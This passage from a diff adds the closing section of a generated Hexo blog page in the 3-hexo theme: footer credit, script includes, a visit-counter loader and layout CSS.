+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
